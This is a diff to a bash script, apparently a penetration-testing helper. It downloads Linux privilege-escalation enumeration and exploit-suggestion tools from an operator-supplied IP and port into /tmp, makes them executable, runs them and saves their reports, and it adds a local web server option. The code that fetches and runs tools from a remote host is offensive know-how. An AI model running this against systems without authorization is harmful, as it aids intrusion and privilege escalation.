@@ -3,6 +3,8 @@
 # TODO
 # - make an interactive option
 # - make adding/running tools modular:
+# - add web server feature
+# - upload reports back to host box 
 
 # Colors
 NC='\033[0m'
@@ -81,6 +83,11 @@ if [[ "$IP" == "" || "$PORT" == "" ]]; then
 		exit 1;
 fi
 
+# Check for web server parameter
+if [[ "$4" != "" ]] ; then
+		WEBSERVER=1;
+fi
+
 # Check Python versions available
 PY2=$(command -v python2);
 if [[ "$PY2" == "" ]]; then
@@ -90,7 +97,7 @@ else
 fi
 PY3=$(command -v python3);
 if [[ "$PY3" == "" ]]; then
-	echo -e "${ORANGE}[!] Python 3 was not found, not all enumeration tools may run!${NC}";
+	echo -e "${ORANGE}[!] Python 3 was not found, not all enumeration tools may run and local web server is unavailable!${NC}";
 else
 	echo -e "${GREEN}[i] Python 3 was found!${NC}";
 fi
@@ -112,127 +119,149 @@ function complete () {
 	sleep 2;
 }
 
-# Download first file, check for wget success code, exit if it failed
-echo -e "${GREEN}[*] Downloading enumeration scripts to /tmp!${NC}";
-wget --max-redirect=0 -nv -t 2 "http://$IP:$PORT/lse.sh" -O "$DIR"/lse.sh;
-RETURN=$?;
+# local web server 
+function webserver () {
+		if [[ "$PY3" == "" ]]; then
+			echo -e "${RED}[!] Python 3 was not found, the web server cannot run. Exiting!${NC}";
+			exit 1;
+		else
+			"$PY3" webserver.py "$IP" "$PORT";
+		fi
+}
 
-if [[ "$RETURN" -ne 0 ]]; then
-		echo -e "${RED}[!] Failed to download first script, bailing out!${NC}";
-		exit 1;
-else
-		chmod +x "$DIR"/lse.sh;
-		wget --max-redirect=0 -nv -t 2 "http://$IP:$PORT/linenum.sh" -O "$DIR"/linenum.sh;
-		chmod +x "$DIR"/linenum.sh;
-		wget --max-redirect=0 -nv -t 2 "http://$IP:$PORT/linuxprivchecker.py" -O "$DIR"/linuxprivchecker.py;
-		chmod +x "$DIR"/linuxprivchecker.py;
-		wget --max-redirect=0 -nv -t 2 "http://$IP:$PORT/uptux.py" -O "$DIR"/uptux.py;
-		chmod +x "$DIR"/uptux.py;
-		wget --max-redirect=0 -nv -t 2 "http://$IP:$PORT/suid3num.py" -O "$DIR"/suid3num.py;
-		chmod +x "$DIR"/suid3num.py;
-		# exploit suggestion tools
-		wget --max-redirect=0 -nv -t 2 "http://$IP:$PORT/les.sh" -O "$DIR"/les.sh;
-		chmod +x "$DIR"/les.sh;
-		wget --max-redirect=0 -nv -t 2 "http://$IP:$PORT/les-soft.py" -O "$DIR"/les-soft.py;
-		chmod +x "$DIR"/les-soft.py;
-		wget --max-redirect=0 -nv -t 2 "http://$IP:$PORT/files_exploits.csv" -O "$DIR"/files_exploits.csv;
-fi
+# Download files
+function download () {
 
-# Ask to run tools
-echo -e "${ORANGE}[?] Run [a]ll, [n]o, [e]numeration, or [s]uggestion tools?${GREEN}";
-read -p "[?] a/n/e/s " answer
-echo -e "${NC}";
-if [[ ${answer} == "all" || ${answer} == "a" ]]; then
-		start "Linux Smart Enumeration";
-		"$DIR"/lse.sh -ci -l 0 | tee "$DIR"/lse-report.txt;
-		complete "Linux Smart Enumeration";
-		start "LinEnum";
-		"$DIR"/linenum.sh -r report -e "$DIR"/linenum-report -t;
-		complete "LinEnum";
-		if [[ "$PY2" == "" && "$PY3" == "" ]]; then
-				echo -e "${ORANGE}[!] No version of Python found, skipping linuxprivchecker!${NC}";
-		elif [[ "$PY2" == "" ]]; then
-				echo -e "${ORANGE}[!] Python 2 was not found, skipping linuxprivchecker!${NC}";
+		# Download first file, check for wget success code, exit if it failed
+		echo -e "${GREEN}[*] Downloading enumeration scripts to /tmp!${NC}";
+		wget --max-redirect=0 -nv -t 2 "http://$IP:$PORT/lse.sh" -O "$DIR"/lse.sh;
+		RETURN=$?;
+
+		if [[ "$RETURN" -ne 0 ]]; then
+				echo -e "${RED}[!] Failed to download first script, bailing out!${NC}";
+				exit 1;
 		else
-				start "linuxprivchecker";
-				python "$DIR"/linuxprivchecker.py | tee "$DIR"/linuxprivchecker-report.txt;
-				complete "linuxprivchecker";
+				chmod +x "$DIR"/lse.sh;
+				wget --max-redirect=0 -nv -t 2 "http://$IP:$PORT/linenum.sh" -O "$DIR"/linenum.sh;
+				chmod +x "$DIR"/linenum.sh;
+				wget --max-redirect=0 -nv -t 2 "http://$IP:$PORT/linuxprivchecker.py" -O "$DIR"/linuxprivchecker.py;
+				chmod +x "$DIR"/linuxprivchecker.py;
+				wget --max-redirect=0 -nv -t 2 "http://$IP:$PORT/uptux.py" -O "$DIR"/uptux.py;
+				chmod +x "$DIR"/uptux.py;
+				wget --max-redirect=0 -nv -t 2 "http://$IP:$PORT/suid3num.py" -O "$DIR"/suid3num.py;
+				chmod +x "$DIR"/suid3num.py;
+
+				# exploit suggestion tools
+				wget --max-redirect=0 -nv -t 2 "http://$IP:$PORT/les.sh" -O "$DIR"/les.sh;
+				chmod +x "$DIR"/les.sh;
+				wget --max-redirect=0 -nv -t 2 "http://$IP:$PORT/les-soft.py" -O "$DIR"/les-soft.py;
+				chmod +x "$DIR"/les-soft.py;
+				wget --max-redirect=0 -nv -t 2 "http://$IP:$PORT/files_exploits.csv" -O "$DIR"/files_exploits.csv;
 		fi
-		if [[ "$PY2" == "" && "$PY3" == "" ]]; then
-				echo -e "${ORANGE}[!] No version of Python found, skipping Uptux!${NC}";
-		else
-				start "Uptux";
-				python "$DIR"/uptux.py -n | tee uptux-report.txt;
-				complete "Uptux";
+}
+
+# Run tools
+function runtools () {
+
+		echo -e "${ORANGE}[?] Run [a]ll, [n]o, [e]numeration, or [s]uggestion tools?${GREEN}";
+		read -p "[?] a/n/e/s " answer
+		echo -e "${NC}";
+		if [[ ${answer} == "all" || ${answer} == "a" ]]; then
+				start "Linux Smart Enumeration";
+				"$DIR"/lse.sh -ci -l 0 | tee "$DIR"/lse-report.txt;
+				complete "Linux Smart Enumeration";
+				start "LinEnum";
+				"$DIR"/linenum.sh -r report -e "$DIR"/linenum-report -t;
+				complete "LinEnum";
+				if [[ "$PY2" == "" && "$PY3" == "" ]]; then
+						echo -e "${ORANGE}[!] No version of Python found, skipping linuxprivchecker!${NC}";
+				elif [[ "$PY2" == "" ]]; then
+						echo -e "${ORANGE}[!] Python 2 was not found, skipping linuxprivchecker!${NC}";
+				else
+						start "linuxprivchecker";
+						python "$DIR"/linuxprivchecker.py | tee "$DIR"/linuxprivchecker-report.txt;
+						complete "linuxprivchecker";
+				fi
+				if [[ "$PY2" == "" && "$PY3" == "" ]]; then
+						echo -e "${ORANGE}[!] No version of Python found, skipping Uptux!${NC}";
+				else
+						start "Uptux";
+						python "$DIR"/uptux.py -n | tee uptux-report.txt;
+						complete "Uptux";
+				fi
+				if [[ "$PY2" == "" && "$PY3" == "" ]]; then
+						echo -e "${ORANGE}[!] No version of Python found, skipping Suid3num!${NC}";
+				else
+						start "Suid3num";
+						python "$DIR"/suid3num.py | tee "$DIR"/suid3num-report.txt;
+						complete "Suid3num";
+				fi
+				# Run exploit suggestion tools
+				start "Linux Exploit Suggester";
+				"$DIR"/les.sh | tee "$DIR"/les-report.txt;
+				complete "Linux Exploit Suggester";
+				if [[ "$PY2" == "" && "$PY3" == "" ]]; then
+						echo -e "${ORANGE}[!] No version of Python found, skipping Linux Soft Exploit Suggester!${NC}";
+				elif [[ "$PY2" == "" ]]; then
+						echo -e "${ORANGE}[!] Python 2 was not found, skipping Linux Soft Exploit Suggester!${NC}";
+				else
+						start "Linux Soft Exploit Suggester";
+						python -u "$DIR"/les-soft.py | tee "$DIR"/les-soft-report.txt;
+						complete "Linux Soft Exploit Suggester";
+				fi
+		elif [[ ${answer} == "no" || ${answer} == "n" ]]; then
+				echo -e "${GREEN}********************************************************************************${NC}";
+				echo -e "${BLUE}Script complete! See $DIR for output.${NC}";
+				echo -e "${GREEN}********************************************************************************${NC}";
+				exit 0;
+		elif [[ ${answer} == "enumeration" || ${answer} == "e" ]]; then
+				start "Linux Smart Enumeration";
+				"$DIR"/lse.sh -ci -l 0 | tee "$DIR"/lse-report.txt;
+				complete "Linux Smart Enumeration";
+				start "LinEnum";
+				"$DIR"/linenum.sh -r report -e "$DIR"/linenum-report -t;
+				complete "LinEnum";
+				if [[ "$PY2" == "" && "$PY3" == "" ]]; then
+						echo -e "${ORANGE}[!] No version of Python found, skipping linuxprivchecker!${NC}";
+				elif [[ "$PY2" == "" ]]; then
+						echo -e "${ORANGE}[!] Python 2 was not found, skipping linuxprivchecker!${NC}";
+				else
+						start "linuxprivchecker";
+						python "$DIR"/linuxprivchecker.py | tee "$DIR"/linuxprivchecker-report.txt;
+						complete "linuxprivchecker";
+				fi
+				if [[ "$PY2" == "" && "$PY3" == "" ]]; then
+						echo -e "${ORANGE}[!] No version of Python found, skipping Uptux!${NC}";
+				else
+						start "Uptux";
+						python "$DIR"/uptux.py -n | tee uptux-report.txt;
+						complete "Uptux";
+				fi
+				if [[ "$PY2" == "" && "$PY3" == "" ]]; then
+						echo -e "${ORANGE}[!] No version of Python found, skipping Suid3num!${NC}";
+				else
+						start "Suid3num";
+						python "$DIR"/suid3num.py | tee "$DIR"/suid3num-report.txt;
+						complete "Suid3num";
+				fi
+		elif [[ ${answer} == "suggestion" || ${answer} == "s" ]]; then
+				start "Linux Exploit Suggester";
+				"$DIR"/les.sh | tee "$DIR"/les-report.txt;
+				complete "Linux Exploit Suggester";
+				if [[ "$PY2" == "" && "$PY3" == "" ]]; then
+						echo -e "${ORANGE}[!] No version of Python found, skipping Linux Soft Exploit Suggester!${NC}";
+				elif [[ "$PY2" == "" ]]; then
+						echo -e "${ORANGE}[!] Python 2 was not found, skipping Linux Soft Exploit Suggester!${NC}";
+				else
+						start "Linux Soft Exploit Suggester";
+						python -u "$DIR"/les-soft.py | tee "$DIR"/les-soft-report.txt;
+						complete "Linux Soft Exploit Suggester";
+				fi
 		fi
-		if [[ "$PY2" == "" && "$PY3" == "" ]]; then
-				echo -e "${ORANGE}[!] No version of Python found, skipping Suid3num!${NC}";
-		else
-				start "Suid3num";
-				python "$DIR"/suid3num.py | tee "$DIR"/suid3num-report.txt;
-				complete "Suid3num";
-		fi
-		# Run exploit suggestion tools
-		start "Linux Exploit Suggester";
-		"$DIR"/les.sh | tee "$DIR"/les-report.txt;
-		complete "Linux Exploit Suggester";
-		if [[ "$PY2" == "" && "$PY3" == "" ]]; then
-				echo -e "${ORANGE}[!] No version of Python found, skipping Linux Soft Exploit Suggester!${NC}";
-		elif [[ "$PY2" == "" ]]; then
-				echo -e "${ORANGE}[!] Python 2 was not found, skipping Linux Soft Exploit Suggester!${NC}";
-		else
-				start "Linux Soft Exploit Suggester";
-				python -u "$DIR"/les-soft.py | tee "$DIR"/les-soft-report.txt;
-				complete "Linux Soft Exploit Suggester";
-		fi
-elif [[ ${answer} == "no" || ${answer} == "n" ]]; then
-		echo -e "${GREEN}********************************************************************************${NC}";
-		echo -e "${BLUE}Script complete! See $DIR for output.${NC}";
-		echo -e "${GREEN}********************************************************************************${NC}";
-		exit 0;
-elif [[ ${answer} == "enumeration" || ${answer} == "e" ]]; then
-		start "Linux Smart Enumeration";
-		"$DIR"/lse.sh -ci -l 0 | tee "$DIR"/lse-report.txt;
-		complete "Linux Smart Enumeration";
-		start "LinEnum";
-		"$DIR"/linenum.sh -r report -e "$DIR"/linenum-report -t;
-		complete "LinEnum";
-		if [[ "$PY2" == "" && "$PY3" == "" ]]; then
-				echo -e "${ORANGE}[!] No version of Python found, skipping linuxprivchecker!${NC}";
-		elif [[ "$PY2" == "" ]]; then
-				echo -e "${ORANGE}[!] Python 2 was not found, skipping linuxprivchecker!${NC}";
-		else
-				start "linuxprivchecker";
-				python "$DIR"/linuxprivchecker.py | tee "$DIR"/linuxprivchecker-report.txt;
-				complete "linuxprivchecker";
-		fi
-		if [[ "$PY2" == "" && "$PY3" == "" ]]; then
-				echo -e "${ORANGE}[!] No version of Python found, skipping Uptux!${NC}";
-		else
-				start "Uptux";
-				python "$DIR"/uptux.py -n | tee uptux-report.txt;
-				complete "Uptux";
-		fi
-		if [[ "$PY2" == "" && "$PY3" == "" ]]; then
-				echo -e "${ORANGE}[!] No version of Python found, skipping Suid3num!${NC}";
-		else
-				start "Suid3num";
-				python "$DIR"/suid3num.py | tee "$DIR"/suid3num-report.txt;
-				complete "Suid3num";
-		fi
-elif [[ ${answer} == "suggestion" || ${answer} == "s" ]]; then
-		start "Linux Exploit Suggester";
-		"$DIR"/les.sh | tee "$DIR"/les-report.txt;
-		complete "Linux Exploit Suggester";
-		if [[ "$PY2" == "" && "$PY3" == "" ]]; then
-				echo -e "${ORANGE}[!] No version of Python found, skipping Linux Soft Exploit Suggester!${NC}";
-		elif [[ "$PY2" == "" ]]; then
-				echo -e "${ORANGE}[!] Python 2 was not found, skipping Linux Soft Exploit Suggester!${NC}";
-		else
-				start "Linux Soft Exploit Suggester";
-				python -u "$DIR"/les-soft.py | tee "$DIR"/les-soft-report.txt;
-				complete "Linux Soft Exploit Suggester";
-		fi
+}
+
+if [[ "$WEBSERVER" -eq 1  ]]; then
+	webserver;
 fi
 
 echo -e "${GREEN}********************************************************************************${NC}";
